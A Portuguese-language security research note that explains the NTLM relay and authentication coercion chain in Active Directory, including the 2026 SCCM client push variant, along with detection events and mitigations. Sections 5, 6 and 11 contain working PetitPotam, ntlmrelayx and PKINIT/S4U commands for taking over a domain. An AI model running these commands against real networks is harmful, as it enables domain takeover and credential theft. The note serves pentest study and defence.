# Coerção de autenticação + NTLM relay: a cadeia que transforma um usuário comum em Domain Admin

*Pesquisa noturna — 19/11/2026. Tema escolhido por ser o elo que falta entre "achei um usuário low-priv" (eJPT/bug bounty) e "comprometi o domínio" (OSCP/pentest interno). Não é resumo de CVE: é o modelo mental que decide se a cadeia funciona ou não.*

---

## 0. Por que este tema, e não outro

Nas últimas semanas eu trabalhei em três frentes: firmware (TRX→UBI→SquashFS), bug bounty web e preparação eJPT. Todas param no mesmo ponto: **o que fazer depois de obter uma credencial válida, porém sem privilégio?** Em ambiente Windows/AD, a resposta clássica é *coerção de autenticação + relay NTLM*. É a técnica que mais converte "usuário comum" em "SYSTEM/DA" com menos pré-requisitos, e é justamente a que eu não tinha documentada com profundidade — só conhecia os nomes das ferramentas (PetitPotam, PrinterBug, ntlmrelayx).

O que segue foi montado a partir de fontes primárias (SpecterOps, RedTeam Pentesting, Microsoft, Elastic) e **validado localmente no meu próprio impacket** onde era possível validar. Onde não pude executar, está marcado como "fonte", não como "medido".

---

## 1. O erro de modelo mental que quase todos cometem

"NTLM relay é roubar o hash." **Não é.** No relay o atacante nunca vê a senha nem o hash utilizável. O que acontece:

1. O cliente (vítima) inicia NTLM com o atacante achando que é um servidor legítimo.
2. O atacante **não responde com um desafio próprio**: ele abre uma conexão com o alvo real (DC, servidor SMB, ADCS) e repassa o desafio (nonce) que o alvo gerou.
3. A vítima cifra o nonce com o hash dela e devolve.
4. O atacante repassa a resposta ao alvo. O alvo valida com o DC: "essa resposta foi produzida com o hash correto".
5. Sessão autenticada — **sem o atacante conhecer segredo algum**.

Consequência prática: relay não quebra criptografia. Ele explora o fato de que a prova de identidade NTLM **não está vinculada ao canal** em que foi produzida. O atacante é um "mensageiro" entre duas conversas que não sabem uma da outra.

Por isso a pergunta certa nunca é "o NTLM é forte?", e sim: **"o alvo aceita essa sessão sem exigir prova de posse da chave de sessão?"**

---

## 2. As quatro camadas que decidem o sucesso

Toda cadeia de coerção+relay tem quatro decisões independentes. Basta uma falhar e o ataque morre — o que explica por que "funciona no lab e não no cliente".

| Camada | Pergunta | Se falhar |
|---|---|---|
| **1. Entrada** | Consigo forçar a vítima a autenticar em mim? Por qual transporte (SMB, HTTP/WebClient, DCERPC raw)? | Sem sessão para relayar |
| **2. Trânsito** | A mensagem NTLM chega "limpa" o suficiente para o alvo aceitar? (MIC, bit de signing) | Alvo rejeita ou ativa signing |
| **3. Destino** | O alvo exige assinatura/canal binding/EPA? | Autentica, mas toda mensagem seguinte é rejeitada |
| **4. Autorização** | O que essa identidade pode fazer no alvo? | Sessão inútil (ex.: conta de máquina sem direitos) |

A camada 3 é a mais mal compreendida. Detalhe contraintuitivo e central:

> **Assinatura SMB é negociada nos headers SMB2, fora do exchange NTLM.** O servidor ignora o que o pacote NTLM diz sobre signing e olha apenas o bit "required" dos headers SMB — headers que o **atacante** controla, porque na perna atacante→alvo ele é o cliente.
>
> Logo: configurar "Microsoft network client: Digitally sign communications (always)" **não impede** relay. Só o lado **servidor** importa. (SpecterOps, *The Renaissance of NTLM Relay Attacks*, abr/2025; Misconfiguration Manager PREVENT-12.)

Segundo detalhe: mesmo que o **cliente** exija signing, o relay continua possível — a autenticação acontece antes de qualquer assinatura, e o atacante não precisa conversar com o cliente depois. Ele só precisa da perna dele com o alvo.

---

## 3. Por que HTTP (WebClient) é o transporte rei para LDAP

Esta foi a parte que mais mudou meu entendimento.

LDAP tem uma armadilha: **assinatura oportunista**. Se o pacote NTLM anuncia suporte a signing, o servidor LDAP liga signing na sessão. O relay "autentica" mas não consegue assinar as mensagens seguintes (não tem a chave de sessão) → inútil.

Então, para relayar contra LDAP, é preciso uma sessão cujo NTLM **não anuncie signing**. E aí está o ponto:

- **SMB** negocia signing nos headers → sempre anuncia capacidade → LDAP liga signing → relay SMB→LDAP morre (somado ao MIC, que bloqueia cross-protocol em sistemas corrigidos).
- **HTTP não tem SSPI request signing.** Uma sessão NTLM sobre HTTP chega sem o bit de signing → LDAP aceita e não liga signing → relay HTTP→LDAP funciona.

É exatamente por isso que "WebClient rodando" é o pré-requisito mais valioso do ataque: o serviço WebClient (WebDAV Redirector) faz o host emitir **HTTP autenticado** para um destino que o atacante controla. Sem ele, o caminho para LDAP fica bloqueado.

E há um detalhe fino de operação: o WebClient só autentica se achar que o destino é "intranet zone". Por isso se usa um registro DNS no domínio apontando para o atacante (ex.: `dnstool.py` do krbrelayx) e o formato `\\attacksystem@80\share` — o `@80` força HTTP e o nome sem sufixo de domínio engana a heurística de zona.

---

## 4. As técnicas de coerção e o estado real em 2025/2026

| Técnica | Interface | Transporte | Disponível em | Estado atual |
|---|---|---|---|---|
| **PrinterBug** | MS-RPRN (`\pipe\spoolss`) | SMB/HTTP → **só DCERPC raw** após Win11 22H2 / WS2025 | clientes e servidores | Ainda funciona; exige relay server que aceite DCERPC raw |
| **PetitPotam** | MS-EFSR (`efsrpc`, `lsarpc`) | SMB e HTTP | on-demand desde 23H2 | Reaberto: serviço pode ser ativado remotamente (ver 4.1) |
| **DFSCoerce** | MS-DFSNM (`netdfs`) | só SMB | somente servidores | Estável; útil quando spooler/EFS estão desligados |
| **WSPCoerce** | MS-WSP (`MsFteWds`) | só SMB | workstations (wsearch) | Implementação Python (RedTeam Pentesting) |
| **SCCM client push** | SCCM/HTTP+WebDAV | HTTP → LDAP | site servers | Cadeia nova (jan/2026), ver §5 |

### 4.1 O detalhe que reabriu o PetitPotam: `efsr_spray`

Desde o 23H2 o serviço EFS não roda por padrão; ele é *on-demand*. Sem o serviço, o pipe `efsrpc` não existe e o PetitPotam falha.

A ativação remota descoberta: **criar um arquivo em um share SMB onde você tem `WRITE`/`MODIFY`**. Nem é preciso ter permissão NTFS — a criação pode falhar no filesystem e ainda assim o serviço acorda. Funciona até em **print queue** (`PRINTQ`). O módulo `efsr_spray` do NetExec automatiza isso share a share.

Isso é uma lição de metodologia, não só de técnica: **"serviço desabilitado por padrão" não é mitigação se ele tem gatilho de ativação.** O mesmo raciocínio vale para WebClient.

### 4.2 WebClient pode ser iniciado remotamente por low-priv? Quase, mas não.

O mito comum é "dá para ligar o WebClient remotamente". O estudo da SpecterOps (ago/2025) mostrou o caminho e o bloqueio:

- Funções EFS downlevel (`EfsRpcDecryptFileSrv`, `EfsRpcQueryUsersOnFile`, etc.) chegam até `davclnt!TriggerStartWebClientService`, que emite um evento ETW com GUID fixo; o evento é consumido pelo UBPM e vira mensagem WNF; o `services.exe` inicia o serviço.
- **Porém o security descriptor do consumidor ETW (UBPM) só aceita UWP, SYSTEM, Administrators e LOCAL.** Numa chamada RPC o token vira token de rede — perde o SID LOCAL. Resultado: localmente (medium integrity) funciona; **remotamente como low-priv, não**.
- Verificação empírica do autor: alterando o SDDL do objeto para permitir o usuário, o serviço sobe — confirmando a causa raiz.

Conclusão registrada: *"Almost, but no."* Extremamente improvável sem outro primitivo que produza token local.

**Mas** — e aqui está a virada — em **SCCM** o site server faz esse mapeamento WebDAV sozinho. É o que a próxima seção explora.

---

## 5. A cadeia de 2026: SCCM client push → WebClient → relay para LDAP

Publicada em 14/01/2026 (Logan Goins / SpecterOps), é o material mais atual que encontrei e o mais aplicável a empresas reais, porque SCCM é onipresente em ambientes corporativos.

**Mecânica descoberta:** durante *automatic client push installation*, o site server tenta mapear shares WebDAV nos clientes — as mesmas chamadas `WNet*` que o `net.exe use` usa para iniciar WebClient. Ou seja: **o site server inicia o WebClient e emite HTTP NTLM para o atacante**, sem que o atacante precise de admin.

Pré-requisitos (todos precisam valer):

1. LDAP signing **ou** LDAPS channel binding desabilitado em pelo menos um DC;
2. WebClient (WebDAV Redirector) **instalado** no site server;
3. Automatic client push installation habilitado;
4. NTLM fallback habilitado no client push.

Fluxo de ataque (ELEVATE-2 + variante nova):

1. Usuário low-priv registra um cliente SCCM falso (hostname/IP do atacante) via SharpSCCM e envia um Heartbeat DDR ao management point.
2. O site server tenta instalar o agente → autentica no atacante.
3. Se o WebClient está instalado, o site server mapeia WebDAV e **inicia o WebClient**; a partir daí o EFSRPC clássico consegue coerção **HTTP** da conta de máquina do site server.
4. Relay para LDAP com `--shadow-credentials` (escreve `msDS-KeyCredentialLink` na conta `SITESRV$`) ou `--delegate-access` (RBCD).
5. PKINIT com o .pfx → TGT da conta de máquina → S4U2Self → impersonar membro de Domain Admins.
6. Com o site server comprometido: autenticar no MSSQL do site database e promover um usuário a **Full Administrator** do SCCM → takeover da hierarquia inteira (não há fronteira de segurança entre sites da mesma hierarquia).

Detalhe de impacto que muda a prioridade: a conta de instalação do client push costuma ser **admin local em todos os clients** e, por conveniência, às vezes é membro de Domain Admins. Relayar essa conta é pior do que relayar a conta de máquina.

Comando exato do artigo (fonte, não executado por mim):

```
python3 PetitPotam.py -u domainuser -p 'password' -d ludus.domain attacker@80/test 10.2.10.15
ntlmrelayx.py -t ldap://10.2.10.10 -smb2support --no-smb-server \
  --shadow-credentials --no-dump --no-da --no-acl --no-validate-privs
python3 PKINITtools/gettgtpkinit.py -cert-pfx <pfx> -pfx-pass <pass> \
  -dc-ip 10.2.10.10 'ludus.domain/SCCM-SITESRV$' out.ccache
python3 PKINITtools/gets4uticket.py 'kerberos+ccache://...' \
  'cifs/sccm-sitesrv.ludus.domain@ludus.domain' 'Administrator@ludus.domain' admin.ccache
```

---

## 6. O que acontece depois do relay (camada 4 — autorização)

Esta é a parte que o relatório precisa explicar, senão o cliente não entende o risco.

**Conta de máquina relayada para LDAP:**
- *Shadow Credentials*: escrever `msDS-KeyCredentialLink` → autenticar com certificado (PKINIT) → TGT → `S4U2Self` → impersonar usuário com admin local naquele host.
- *RBCD*: escrever `msDS-AllowedToActOnBehalfOfOtherIdentity` → conta controlada com SPN solicita ticket para o host.
- Se o alvo for **conta de máquina de DC**: não precisa de truque de impersonação — tem privilégio de DCSync. Relay bem-sucedido ali = domínio inteiro.

**Relay para ADCS (ESC8):**
```
ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController
```
→ certificado → PKINIT → DA. Vetor clássico, ainda comum; mitigado por EPA e por desabilitar web enrollment HTTP (padrão no WS2025).

**Relay para MSSQL:** no caso SCCM, o site server é admin local do site database; via SQL dá para se auto-promover a Full Administrator do SCCM.

---

## 7. Validação local (o que eu realmente medi)

Instalei/tenho impacket **0.13.1** no venv do LIBERTUS. Rodei o help e confirmei que as flags necessárias existem nesta versão:

```
$ venv/bin/ntlmrelayx.py -h | grep ...
--remove-mic          Remove MIC (exploit CVE-2019-1040)
--delegate-access     Delegate access on relayed computer account to the ...
--escalate-user ESCALATE_USER
--adcs                Enable AD CS relay attack
--shadow-credentials  Enable Shadow Credentials relay attack (msDS-...)
--dump-laps / --dump-gmsa / --add-computer / --sid
-6, --ipv6            Listen on IPv6
--no-smb-server / --no-http-server / --no-wcf-server / --no-raw-server
--smb-port / --http-port
```

Três leituras importantes disso:

1. `--no-raw-server` existir implica que esta versão **aceita DCERPC raw** — é o suporte que o PR 1974 adicionou para relayar PrinterBug pós-Win11 22H2. Ou seja: meu impacket já está apto para o cenário moderno.
2. `--shadow-credentials` e `--delegate-access` estão nativos; não preciso de script externo para a fase LDAP.
3. `--remove-mic` está lá, mas só serve para NTLMv1 (raro e desabilitado com Credential Guard). Não é plano A.

O que **não** pude medir: a cadeia ponta a ponta. Não tenho AD lab (DC + member + atacante) montado nesta máquina. Portanto, tudo na §5 é "fonte", não "medido" — e é assim que deve ser lido até eu montar o lab.

---

## 8. Detecção (lado blue team, para o relatório da SHIELD)

O padrão detectável é a **sequência curta**: acesso a named pipe de coerção seguido, em segundos, de logon de rede NTLM de conta de máquina vindo de IP que não é o próprio host.

- **5145** (Detailed File Share) no alvo, com `Relative Target Name` em: `Spoolss`, `netdfs`, `efsrpc`, `lsarpc`, `lsass`, `netlogon`, `samr`, `FssagentRpc`, `eventlog`, `winreg`, `srvsvc`, `dnsserver`, `dhcpserver`, `WinsPipe`.
- **4624** tipo 3 (network), `AuthenticationPackageName = NTLM`, conta terminando em `$`, cujo nome casa com o hostname, `Source IP` ≠ IP do host.
- **4625** no mesmo padrão = tentativa de coerção que falhou (ainda é sinal).
- **4776** no DC (validação NTLM) para correlacionar conta/hora.
- **MDI**: alerta "Suspicious Network Connection over EFS-RPC" e "Suspected NTLM relay attack".
- **Elastic** tem regra pronta (`credential_access_dollar_account_relay_ntlm`) com `sequence by winlog.computer_name, source.ip with maxspan=5s` unindo 5145 → 4624/4625. Vale copiar a lógica, não só o nome.

Custo honesto: 5145 exige habilitar auditoria "Detailed File Share", que é barulhenta. Em cliente pequeno, a alternativa é telemetria de endpoint/ETW em vez de log de segurança.

---

## 9. Mitigação, em ordem de eficácia real

1. **Matar o NTLM** onde possível (política de domínio, auditoria primeiro). Relay é sintoma; NTLM é a doença.
2. **SMB signing required em todos os servidores** (não só DCs). `RequireSecuritySignature=1`. Lembre: no cliente não resolve.
3. **LDAP signing required + LDAPS channel binding "Always"**. Sem isso, HTTP→LDAP continua viável.
4. **EPA em ADCS** e desabilitar HTTP web enrollment.
5. **Remover WebClient/WebDAV Redirector de servidores** — especialmente site servers SCCM. É feature opcional; quase nunca é necessária.
6. **Desabilitar Print Spooler em DCs** e onde não há impressão.
7. **Desabilitar serviço EFS** onde não se usa EFS (fecha o gatilho do `efsr_spray`).
8. **SCCM: desabilitar NTLM fallback no client push** e usar PKI; não usar Domain Admin como conta de instalação.
9. **Credential Guard / Protected Users** para reduzir material relayável.
10. **Tiering**: conta de instalação de client push não deve ter admin em servidores de Tier 0.

Tabela de defaults que importa para argumentar com cliente (fonte: RedTeam Pentesting, 2025):

| SO | SMB signing required | LDAP signing | Channel binding |
|---|---|---|---|
| WS2019 DC | ✅ | ❌ | ❌ |
| WS2022 DC pre-23H2 | ✅ | ❌ | ❌ |
| WS2022 DC 23H2 | ✅ | ✅ | ✅ |
| WS2025 DC | ✅ | ✅ | ✅ (EPA on) |
| WS2019/2022/2025 member | ❌ | – | – |
| Win10 / Win11 23H2 | ❌ | – | – |
| Win11 24H2 | ✅ | – | – |

Leitura estratégica: **member servers e estações antigas continuam sendo o elo fraco**, e a maioria dos parques é *upgrade*, não instalação limpa — os novos defaults não se aplicam retroativamente.

---

## 10. Correções que faço em mim mesmo

1. Eu tratava "SMB signing" como mitigação genérica de relay. **Errado.** É um bit negociado nos headers SMB2, e apenas o lado servidor conta. Mitigação de cliente é teatro.
2. Eu achava que relay SMB→LDAP era rotina. **Não é**: MIC + assinatura oportunista do LDAP bloqueiam. O caminho real é HTTP (WebClient) → LDAP.
3. Eu achava que "serviço on-demand" era mitigação. **Não é**: EFS acorda com um `WRITE` em share; WebClient acorda com mapeamento WebDAV. Gatilho de ativação é superfície de ataque.
4. Eu ia repetir o mito "dá para iniciar WebClient remotamente como low-priv". A evidência de 2025 diz *almost, but no* — o SD do consumidor UBPM bloqueia. Mas o SCCM faz isso por acidente de design, o que é ainda mais interessante.

---

## 11. Próximo passo concreto (não promessa, plano)

Montar um AD lab mínimo e reproduzir a cadeia de ponta a ponta — sem isso, este documento continua sendo "li em fonte confiável", não "verifiquei":

- 1 DC Windows Server 2019 (defaults: SMB signing yes, LDAP signing no) 
- 1 member server 2022 com share `WRITE` para o `efsr_spray`
- atacante Linux com impacket 0.13.1 (já tenho) + NetExec + PKINITtools
- ordem de execução: `nxc smb --gen-relay-list` → `efsr_spray` → `ntlmrelayx -t ldap --shadow-credentials` → `gettgtpkinit` → `gets4uticket` → `secretsdump`

Critério de sucesso do lab: `Authenticating against ldap://... as <HOST>$ SUCCEED` e um TGT utilizável. Se não chegar lá, o documento ganha uma seção "o que não funciona como a fonte diz" — que é ainda mais valiosa.

---

## Fontes

1. Elad Shamir / SpecterOps — *The Renaissance of NTLM Relay Attacks: Everything You Need to Know* (08/04/2025). https://specterops.io/blog/2025/04/08/the-renaissance-of-ntlm-relay-attacks-everything-you-need-to-know
2. RedTeam Pentesting — *The Ultimate Guide to Windows Coercion Techniques in 2025* (04/06/2025). https://blog.redteam-pentesting.de/2025/windows-coercion/
3. Steven Flores / SpecterOps — *Will WebClient Start* (19/08/2025). https://specterops.io/blog/2025/08/19/will-webclient-start/
4. Logan Goins / SpecterOps — *Wait, Why is my WebClient Started?: SCCM Hierarchy Takeover via NTLM Relay to LDAP* (14/01/2026). https://specterops.io/blog/2026/01/14/wait-why-is-my-webclient-started-sccm-hierarchy-takeover-via-ntlm-relay-to-ldap
5. Chris Thompson / SpecterOps — *Coercing NTLM Authentication from SCCM* (13/04/2022). https://specterops.io/blog/2022/04/13/coercing-ntlm-authentication-from-sccm
6. SpecterOps — Misconfiguration Manager, PREVENT-12 (SMB signing). https://docs.specterops.io/misconfiguration-manager-docs/defense-techniques/PREVENT/PREVENT-12/prevent-12_description
7. Microsoft — *Mitigating NTLM Relay Attacks by Default* (12/2024) e KB5005413 (ADCS/EPA).
8. Elastic — regra *Potential NTLM Relay Attack against a Computer Account* (sequência 5145→4624/4625).
9. Unidade 42 / Palo Alto — *Authentication Coercion Keeps Evolving* (tabela de interfaces/pipes).
10. Validação local: impacket 0.13.1, `venv/bin/ntlmrelayx.py -h` (19/11/2026).
